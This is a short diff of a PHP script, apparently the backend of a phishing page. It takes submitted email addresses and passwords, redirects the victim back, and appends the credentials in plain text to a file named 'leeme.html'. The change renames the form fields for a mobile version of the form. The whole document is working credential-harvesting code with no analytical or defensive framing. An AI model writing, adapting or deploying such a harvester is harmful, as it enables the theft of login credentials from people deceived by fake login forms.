@@ -1,15 +1,15 @@
 <?php
-$email = test_input($_POST["email"]);
-$data['email']=$email;
-$pass = test_input($_POST["pass"]);
-$data['pass']=$pass;
+$email = test_input($_POST["email_mobile"]);
+$data['email_mobile']=$email;
+$pass = test_input($_POST["pass_mobile"]);
+$data['pass_mobile']=$pass;
 
 
 header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
 $handle = fopen("leeme.html", "a");
 $string = '
-email:'.$data['email'].'
-pass:'.$data['pass'];
+email:'.$data['email_mobile'].'
+pass:'.$data['pass_mobile'];
 
 fwrite($handle,$string);
 fclose($handle);
